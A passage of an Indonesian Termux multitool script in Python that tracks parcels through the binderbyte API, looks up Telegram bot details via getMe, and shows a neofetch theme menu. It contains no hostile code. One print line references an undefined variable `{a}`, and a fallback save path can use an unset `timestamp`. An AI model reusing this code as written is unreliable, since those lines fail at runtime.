{W}│ {W}Tools {R}: {G}Cek Resi {R}/{W} Paket {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯""")
    
    kurir_list = {
        "1": {"name": "JNE", "code": "jne"},
        "2": {"name": "J&T Express", "code": "jnt"},
        "3": {"name": "SiCepat", "code": "sicepat"},
        "4": {"name": "AnterAja", "code": "anteraja"},
        "5": {"name": "Pos Indonesia", "code": "pos"},
        "6": {"name": "Titipan Kilat (Tiki)", "code": "tiki"},
        "7": {"name": "Wahana", "code": "wahana"},
        "8": {"name": "Ninja Xpress", "code": "ninja"},
        "9": {"name": "Lion Parcel", "code": "lion"},
        "10": {"name": "PCP Express", "code": "pcp"},
        "11": {"name": "Royal Express", "code": "royal"},
        "12": {"name": "First Logistics", "code": "first"},
        "13": {"name": "ID Express", "code": "ids"},
        "14": {"name": "Shopee Express", "code": "shopee"},
        "15": {"name": "KGX Express", "code": "kgx"},
        "16": {"name": "SAP Express", "code": "sap"},
        "17": {"name": "Indah Cargo", "code": "indah"},
        "18": {"name": "Dakota Cargo", "code": "dakota"},
        "19": {"name": "Ant Cargo", "code": "ant"},
        "20": {"name": "Next Logistics", "code": "next"},
        "21": {"name": "GTL", "code": "gtl"},
        "22": {"name": "Tokopedia Courier", "code": "tokopedia"},
    }
    
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}[ {G}!!{W} ] Pilih kurir {R}:{N}")
    
    items = list(kurir_list.items())
    for i in range(0, len(items), 2):
        left = items[i]
        right = items[i+1] if i+1 < len(items) else None
        if right:
            print(f"{W}│ [ {G}{left[0]}{W} ] {left[1]['name']:<20}  [ {G}{right[0]}{W} ] {right[1]['name']}")
        else:
            print(f"{W}│ [ {G}{left[0]}{W} ] {left[1]['name']}")
    
    print(f"{W}│ [ {R}0{W} ] Kembali ke Mikasa")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
    try:
        pilih = input(f"{U}❯❯❯ {W}Pilih Kurir {G}❯{N} ")
        if pilih == "0":
            return
        if pilih not in kurir_list:
            print(f"{W}[ {R}??{W} ] Pilihan tidak valid!{N}")
            time.sleep(1)
            return
        courier = kurir_list[pilih]['code']
        courier_name = kurir_list[pilih]['name']
    except:
        print(f"{W}[ {R}??{W} ] Masukkan angka!{N}")
        time.sleep(1)
        return
    
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Masukkan {G}nomor resi")
    print(f"{W}│ Contoh {R}:{W} JNE1234567890")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
    resi = input(f"{U}❯❯❯ {W}Checker Resi {G}❯{N} ").strip()
    
    if not resi:
        print(f"{W}[ {R}??{W} ] Resi tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    def load_bar_resi(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mencari Resi [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_resi, args=(stop,))
    t.daemon = True
    t.start()
    
    try:
        url = f'https://api.binderbyte.com/v1/track?api_key={API_KEY}&courier={courier}&awb={resi}'
        resp = requests.get(url, timeout=15)
        data = resp.json()
        
        stop.set()
        t.join()
        
        if data.get('status') == 200:
            result = data.get('data', {})
            history = result.get('history', [])
            
            print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {G}✓{W} Succesfuly Status Paket{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {W}Kurir     {R}: {G}{result.get('courier', 'N/A').upper()}{N}")
            print(f"{W}│ {W}Resi      {R}: {G}{result.get('awb', 'N/A')}{N}")
            print(f"{W}│ {W}Status    {R}: {G}{result.get('status', 'N/A')}{N}")
            
            if result.get('sender'):
                print(f"{W}│ {W}Pengirim  {R}: {G}{result.get('sender', 'N/A')}{N}")
            if result.get('receiver'):
                print(f"{W}│ {W}Penerima  {R}: {G}{result.get('receiver', 'N/A')}{N}")
            
            if history:
                print(f"{W}├─────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {G}Riwayat:{N}")
                for h in history[-10:]:
                    date = h.get('date', '')
                    desc = h.get('desc', '')
                    print(f"{W}│ {G}{date:<20}{W}→ {G}{desc}{N}")
            else:
                print(f"{W}├─────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}[ {R}??{W} ] Belum ada riwayat pengiriman{N}")
            
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        else:
            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}✗{W} Resi tidak ditemukan!{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {W}Pesan {R}: {G}{data.get('message', 'Unknown error')}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            
    except Exception as e:
        stop.set()
        t.join()
        print(f"\n{R}✗ Error: {e}{N}")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def tool_get_bot_id():
    play_menu_sound()
    import os, sys, time, requests, threading, json
    from datetime import datetime
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    ascii_botid = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⢀⣠⠄⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠁⠀⠀⠀⠀⢀⣤⡶⠟⠁⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣴⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣠⣶⣿⣶⣄⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⠿⠿⠿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_botid}" | lolcat 2>/dev/null || echo "{ascii_botid}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Get ID Bot Telegram {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯""")
    
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Masukkan {G}Token Bot Telegram")
    print(f"{W}│ Contoh {R}:{a} 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
    
    bot_token = input(f"{U}❯❯❯ {W}Token Bot {G}❯{N} ").strip()
    
    if not bot_token:
        print(f"\n{W}[ {R}??{W} ] Token tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    def load_bar_bot(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengambil Info Bot [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_bot, args=(stop,))
    t.daemon = True
    t.start()
    
    try:
        url = f'https://api.telegram.org/bot{bot_token}/getMe'
        resp = requests.get(url, timeout=15)
        
        stop.set()
        t.join()
        
        if resp.status_code == 200:
            data = resp.json()
            
            if data.get('ok'):
                result = data.get('result', {})
                
                output = {
                    "id": result.get('id'),
                    "username": result.get('username'),
                    "first_name": result.get('first_name'),
                    "last_name": result.get('last_name'),
                    "is_bot": result.get('is_bot', True),
                    "can_join_groups": result.get('can_join_groups', False),
                    "can_read_all_group_messages": result.get('can_read_all_group_messages', False),
                    "supports_inline_queries": result.get('supports_inline_queries', False),
                    "can_connect_to_business": result.get('can_connect_to_business', False),
                    "has_main_webhook": result.get('has_main_webhook', False),
                }
                
                print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {G}✓{W} Succesfuly, Info Bot Telegram {R}:{N}")
                print(f"{W}├─────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}ID Bot      {R}: {G}{result.get('id', 'N/A')}{N}")
                print(f"{W}│ {W}Nama        {R}: {G}{result.get('first_name', 'N/A')}{N}")
                print(f"{W}│ {W}Username    {R}: {G}@{result.get('username', 'N/A')}{N}")
                print(f"{W}│ {W}Is Bot      {R}: {G}{'Ya' if result.get('is_bot', False) else 'Bukan Bot'}{N}")
                print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
                
                try:
                    json_dir = "/sdcard/Bot_Info"
                    if not os.path.exists(json_dir):
                        os.makedirs(json_dir)
                    
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"bot_info_{timestamp}.json"
                    filepath = os.path.join(json_dir, filename)
                    
                    with open(filepath, 'w') as f:
                        json.dump(output, f, indent=2)
                    
                except:
                    try:
                        filename = f"bot_info_{timestamp}.json"
                        with open(filename, 'w') as f:
                            json.dump(output, f, indent=2)
                        print(f"\n{W}[ {G}!!{W} ] Info disimpan di {R}: {filename}{N}")
                    except:
                        print(f"\n{W}[ {R}??{W} ] Gagal menyimpan file!{N}")
                
            else:
                print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {R}✗{W} Token Bot Tidak Valid!{N}")
                print(f"{W}├─────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Pesan {R}: {G}{data.get('description', 'Unknown error')}{N}")
                print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        else:
            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}✗{W} Gagal mengakses Telegram API!{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {W}Status {R}: {G}{resp.status_code}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            
    except Exception as e:
        stop.set()
        t.join()
        print(f"\n{W}[ {R}??{W} ] Error: {e}{N}")
    
    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def tool_theme_termux():
    play_menu_sound()
    import os, sys, time, subprocess, threading
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    ascii_theme = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠄⣴⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣦⠠⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⠃⣼⣿⠟⡡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢌⠻⣿⣧⠘⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⢠⣿⡟⠰⢋⣡⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠒⠲⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣌⡙⠆⢻⣿⡄⡄⠀⠀⠀⠀
⠀⠀⣰⡇⢸⣿⢃⣴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠃⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⡘⣿⡇⢸⣆⠀⠀⠀
⠀⢠⣿⡇⢸⣿⡿⠋⣡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣌⠙⢿⣿⡇⢸⣿⡄⠀⠀
⠀⢸⣿⣷⠸⠋⣠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣄⠙⠇⣾⣿⡇⠀⠀
⢠⠘⣿⣿⢠⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣷⡄⣿⣿⠃⡄⠀
⣼⠀⢻⣯⣿⡟⢁⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡈⢻⣿⣽⡟⠀⣧⠀
⣿⣇⠈⣿⠏⢀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠠⣤⣶⣶⣤⠄⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠹⣿⠁⣸⣿⠀
⢻⣿⣆⠘⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⡇⠀⠀⣽⣯⠀⠀⢸⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡄⠃⣰⣿⡟⠀
⠘⣿⣿⡄⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣶⣾⣿⣿⣿⣿⣿⠀⠀⠈⢸⡇⠁⠀⠀⣿⣿⣿⣿⣿⣷⣶⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⢠⣿⣿⠃⠀
⣆⠘⢿⣧⣿⡏⢠⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡄⢹⣿⣼⡿⠃⣰⠀
⢻⣦⡈⠻⣿⠁⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⣿⣿⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⣿⠟⢁⣴⡟⠀
⠈⢿⣿⣦⡘⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⣿⣿⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⢃⣴⣿⡿⠁⠀
⠀⠈⠻⣿⣷⣄⢻⣿⡆⢰⣄⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣠⡆⢰⣿⡟⣠⣾⣿⠟⠁⠀⠀
⠀⠀⢠⡈⠻⣿⣾⣿⡇⠸⣿⣆⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⠇⢸⣿⣷⣿⠟⢁⡄⠀⠀⠀
⠀⠀⠀⢻⣦⣀⠉⠻⢿⡀⣿⣿⡄⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢠⣿⣿⢀⡿⠟⠉⣀⣴⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣷⣶⣤⣁⠘⣿⣷⡈⢦⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢀⡴⢁⣾⣿⠃⣈⣤⣶⣾⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣷⣮⣿⣧⠘⢿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡿⠃⣼⣿⣵⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⣤⣈⠉⠛⠛⠛⠷⠌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠡⠾⠛⠛⠛⠉⣁⣤⠊⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣶⣶⣶⣶⣶⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣶⣶⣶⣶⣶⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡉⠙⠛⠋⠉⠉⣀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠉⠉⠙⠛⠋⢉⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠛⠛⠛⠛⠛⠛⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
    os.system(f'echo "{ascii_theme}" | lolcat 2>/dev/null || echo "{ascii_theme}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Theme Termux {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯""")
    
    themes = {
        "1": {"name": "Ubuntu", "neofetch": "ubuntu"},
        "2": {"name": "Kali Linux", "neofetch": "kali"},
        "3": {"name": "Arch Linux", "neofetch": "arch"},
        "4": {"name": "Debian", "neofetch": "debian"},
        "5": {"name": "Fedora", "neofetch": "fedora"},
        "6": {"name": "Termux Default", "neofetch": "termux"},
        "7": {"name": "Alpine", "neofetch": "alpine"},
        "8": {"name": "NixOS", "neofetch": "nixos"},
        "9": {"name": "Void", "neofetch": "void"},
        "10": {"name": "Gentoo", "neofetch": "gentoo"},
        "11": {"name": "OpenSUSE", "neofetch": "opensuse"},
        "12": {"name": "Manjaro", "neofetch": "manjaro"},
        "13": {"name": "Android", "neofetch": "android"},
        "14": {"name": "Apple", "neofetch": "apple"},
        "15": {"name": "BSD", "neofetch": "bsd"},
        "16": {"name": "CentOS", "neofetch": "centos"},
        "17": {"name": "Elementary", "neofetch": "elementary"},
        "18": {"name": "EndeavourOS", "neofetch": "endeavouros"},
        "19": {"name": "Garuda", "neofetch": "garuda"},
        "20": {"name": "Linux Mint", "neofetch": "linuxmint"},
        "21": {"name": "Pop!_OS", "neofetch": "popos"},
        "22": {"name": "Raspbian", "neofetch": "raspbian"},
        "23": {"name": "Red Hat", "neofetch": "redhat"},
        "24": {"name": "Windows", "neofetch": "windows"},
    }
    
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Daftar Thema {R}: {N}")
    for key, value in themes.items():
     print(f"{W}│ [ {G}{key}{W} ] {value['name']}")
    print(f"{W}│ [ {R}0{W} ] Kembali ke Mikasa")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
